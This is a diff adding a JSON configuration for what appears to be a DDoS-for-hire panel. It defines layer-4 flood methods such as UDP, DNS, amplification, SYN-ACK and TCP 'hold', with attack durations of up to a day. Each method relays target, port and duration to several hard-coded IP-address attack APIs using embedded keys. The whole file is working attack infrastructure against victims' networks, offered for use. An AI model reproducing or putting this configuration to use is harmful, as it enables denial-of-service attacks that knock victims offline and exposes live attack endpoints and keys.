@@ -1,0 +1,353 @@
+{
+    "home-udp": {
+        "disabled": false,
+        "description": "Placeholder L4 Method",
+        "access": [],
+        "ip_allowed": true,
+        "url_allowed": false,
+        "default_port": 53,
+        "default_duration": 30,
+        "options": {
+            "enhanced_maxtime": 86400,
+            "maxtime_override": 0,
+            "minimum_duration": 60,
+            "bypass_cooldown": false,
+            "ongoing_cap": 0,
+            "method_group": "layer4",
+            "api": true,
+            "bot": true,
+            "url_encoding": false,
+            "key_values": {
+                "len": {
+                    "default": "1024",
+                    "data_type": "INT",
+                    "int_maximum": 12,
+                    "string_maximum": 4,
+                    "set_required": false
+                }
+            }
+        },
+        "urls": [
+            "http://5.59.248.48/API.php?key=LustNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=home-udp",
+            "http://185.132.53.36/api.php?key=BhitzNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=home-udp",
+            "http://143.20.77.12/api.php?key=BhitzNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=home-udp",
+            "http://173.212.228.38/api.php?key=BhitzNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=home-udp",
+            "http://5.59.248.50/API.php?key=LustNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=home-udp",
+            "http://5.59.248.42//API.php?key=LustNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=home-udp"
+        ],
+        "servers": [
+            {
+                "name": "",
+                "commands": [
+                    ""
+                ]
+            }
+        ]
+    },
+    "home-hold": {
+        "disabled": false,
+        "description": "Placeholder L4 Method",
+        "access": [],
+        "ip_allowed": true,
+        "url_allowed": false,
+        "default_port": 53,
+        "default_duration": 30,
+        "options": {
+            "enhanced_maxtime": 86400,
+            "maxtime_override": 0,
+            "minimum_duration": 60,
+            "bypass_cooldown": false,
+            "ongoing_cap": 0,
+            "method_group": "layer4",
+            "api": true,
+            "bot": true,
+            "url_encoding": false,
+            "key_values": {
+                "len": {
+                    "default": "1024",
+                    "data_type": "INT",
+                    "int_maximum": 12,
+                    "string_maximum": 4,
+                    "set_required": false
+                }
+            }
+        },
+        "urls": [
+            "http://5.59.248.48/API.php?key=LustNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=home-hold",
+            "http://185.132.53.36/api.php?key=BhitzNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=home-hold",
+            "http://143.20.77.12/api.php?key=BhitzNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=home-hold",
+            "http://5.59.248.50/API.php?key=LustNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=home-hold",
+            "http://5.59.248.42/API.php?key=LustNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=home-hold"
+        ],
+        "servers": [
+            {
+                "name": "",
+                "commands": [
+                    ""
+                ]
+            }
+        ]
+    },
+    "dns-hold": {
+        "disabled": false,
+        "description": "Placeholder L4 Method",
+        "access": [],
+        "ip_allowed": true,
+        "url_allowed": false,
+        "default_port": 53,
+        "default_duration": 30,
+        "options": {
+            "enhanced_maxtime": 86400,
+            "maxtime_override": 0,
+            "minimum_duration": 60,
+            "bypass_cooldown": false,
+            "ongoing_cap": 0,
+            "method_group": "layer4",
+            "api": true,
+            "bot": true,
+            "url_encoding": false,
+            "key_values": {
+                "len": {
+                    "default": "1024",
+                    "data_type": "INT",
+                    "int_maximum": 12,
+                    "string_maximum": 4,
+                    "set_required": false
+                }
+            }
+        },
+        "urls": [
+            "http://5.59.248.48/API.php?key=LustNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=dns-hold",
+            "http://185.132.53.36/api.php?key=BhitzNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=dns-hold",
+            "http://143.20.77.12/api.php?key=BhitzNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=dns-hold",
+            "http://173.212.228.38/api.php?key=BhitzNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=dns-hold",
+            "http://5.59.248.50/API.php?key=LustNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=dns-hold",
+            "http://5.59.248.42/API.php?key=LustNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=dns-hold"
+        ],
+        "servers": [
+            {
+                "name": "test",
+                "commands": [
+                    ""
+                ]
+            }
+        ]
+    },
+    "mixamp-hold": {
+        "disabled": false,
+        "description": "Placeholder L4 Method",
+        "access": [],
+        "ip_allowed": true,
+        "url_allowed": false,
+        "default_port": 53,
+        "default_duration": 30,
+        "options": {
+            "enhanced_maxtime": 86400,
+            "maxtime_override": 0,
+            "minimum_duration": 60,
+            "bypass_cooldown": false,
+            "ongoing_cap": 0,
+            "method_group": "layer4",
+            "api": true,
+            "bot": true,
+            "url_encoding": false,
+            "key_values": {
+                "len": {
+                    "default": "1024",
+                    "data_type": "INT",
+                    "int_maximum": 12,
+                    "string_maximum": 4,
+                    "set_required": false
+                }
+            }
+        },
+        "urls": [
+            "http://5.59.248.48/API.php?key=LustNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=mixamp-hold",
+            "http://185.132.53.36/api.php?key=BhitzNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=mixamp-hold",
+            "http://143.20.77.12/api.php?key=BhitzNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=mixamp-hold",
+            "http://173.212.228.38/api.php?key=BhitzNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=mixamp-hold",
+            "http://5.59.248.50/API.php?key=LustNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=mixamp-hold",
+            "http://5.59.248.42/API.php?key=LustNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=mixamp-hold"
+        ],
+        "servers": [
+            {
+                "name": "test",
+                "commands": [
+                    ""
+                ]
+            }
+        ]
+    },
+    "synack-hold": {
+        "disabled": false,
+        "description": "Placeholder L4 Method",
+        "access": [],
+        "ip_allowed": true,
+        "url_allowed": false,
+        "default_port": 53,
+        "default_duration": 30,
+        "options": {
+            "enhanced_maxtime": 86400,
+            "maxtime_override": 0,
+            "minimum_duration": 60,
+            "bypass_cooldown": false,
+            "ongoing_cap": 0,
+            "method_group": "layer4",
+            "api": true,
+            "bot": true,
+            "url_encoding": false,
+            "key_values": {
+                "len": {
+                    "default": "1024",
+                    "data_type": "INT",
+                    "int_maximum": 12,
+                    "string_maximum": 4,
+                    "set_required": false
+                }
+            }
+        },
+        "urls": [
+            "http://5.59.248.48/API.php?key=LustNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=synack-hold",
+            "http://185.132.53.36/api.php?key=BhitzNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=synack-hold",
+            "http://143.20.77.12/api.php?key=BhitzNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=synack-hold",
+            "http://173.212.228.38/api.php?key=BhitzNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=synack-hold",
+            "http://5.59.248.50/API.php?key=LustNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=synack-hold",
+            "http://5.59.248.42/API.php?key=LustNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=synack-hold"
+        ],
+        "servers": [
+            {
+                "name": "test",
+                "commands": [
+                    ""
+                ]
+            }
+        ]
+    },
+    "tcp-hold": {
+        "disabled": false,
+        "description": "Placeholder L4 Method",
+        "access": [],
+        "ip_allowed": true,
+        "url_allowed": false,
+        "default_port": 53,
+        "default_duration": 30,
+        "options": {
+            "enhanced_maxtime": 86400,
+            "maxtime_override": 0,
+            "minimum_duration": 60,
+            "bypass_cooldown": false,
+            "ongoing_cap": 0,
+            "method_group": "layer4",
+            "api": true,
+            "bot": true,
+            "url_encoding": false,
+            "key_values": {
+                "len": {
+                    "default": "1024",
+                    "data_type": "INT",
+                    "int_maximum": 12,
+                    "string_maximum": 4,
+                    "set_required": false
+                }
+            }
+        },
+        "urls": [
+            "http://5.59.248.48/API.php?key=LustNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=tcp-hold",
+            "http://185.132.53.36/api.php?key=BhitzNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=tcp-hold",
+            "http://143.20.77.12/api.php?key=BhitzNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=tcp-hold",
+            "http://173.212.228.38/api.php?key=BhitzNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=tcp-hold",
+            "http://5.59.248.50/API.php?key=LustNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=tcp-hold",
+            "http://5.59.248.42/API.php?key=LustNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=tcp-hold"
+        ],
+        "servers": [
+            {
+                "name": "test",
+                "commands": [
+                    ""
+                ]
+            }
+        ]
+    },
+    "socket-hold": {
+        "disabled": false,
+        "description": "Placeholder L4 Method",
+        "access": [],
+        "ip_allowed": true,
+        "url_allowed": false,
+        "default_port": 53,
+        "default_duration": 30,
+        "options": {
+            "enhanced_maxtime": 86400,
+            "maxtime_override": 0,
+            "minimum_duration": 60,
+            "bypass_cooldown": false,
+            "ongoing_cap": 0,
+            "method_group": "layer4",
+            "api": true,
+            "bot": true,
+            "url_encoding": false,
+            "key_values": {
+                "len": {
+                    "default": "1024",
+                    "data_type": "INT",
+                    "int_maximum": 12,
+                    "string_maximum": 4,
+                    "set_required": false
+                }
+            }
+        },
+        "urls": [
+            "http://5.59.248.48/API.php?key=LustNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=socket-hold",
+            "http://185.132.53.36/api.php?key=BhitzNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=socket-hold",
+            "http://143.20.77.12/api.php?key=BhitzNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=socket-hold",
+            "http://173.212.228.38/api.php?key=BhitzNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=socket-hold",
+            "http://5.59.248.50/API.php?key=LustNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=socket-hold",
+            "http://5.59.248.42/API.php?key=LustNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=socket-hold"
+        ],
+        "servers": [
+            {
+                "name": "test",
+                "commands": [
+                    ""
+                ]
+            }
+        ]
+    },
+    "udpbypass-hold": {
+        "disabled": false,
+        "description": "Placeholder L4 Method",
+        "access": [],
+        "ip_allowed": true,
+        "url_allowed": false,
+        "default_port": 53,
+        "default_duration": 30,
+        "options": {
+            "enhanced_maxtime": 86400,
+            "maxtime_override": 0,
+            "minimum_duration": 60,
+            "bypass_cooldown": false,
+            "ongoing_cap": 0,
+            "method_group": "layer4",
+            "api": true,
+            "bot": true,
+            "url_encoding": false,
+            "key_values": {
+                "len": {
+                    "default": "1024",
+                    "data_type": "INT",
+                    "int_maximum": 12,
+                    "string_maximum": 4,
+                    "set_required": false
+                }
+            }
+        },
+        "urls": [
+            "http://5.59.248.48/API.php?key=LustNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=udpbypass-hold",
+            "http://185.132.53.36/api.php?key=BhitzNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=udpbypass-hold",
+            "http://143.20.77.12/api.php?key=BhitzNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=udpbypass-hold",
+            "http://173.212.228.38/api.php?key=BhitzNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=udpbypass-hold",
+            "http://5.59.248.50/API.php?key=LustNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=udp-hold",
+            "http://5.59.248.42/API.php?key=LustNetwork&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=udp-hold"
+        ]
+    }
+}
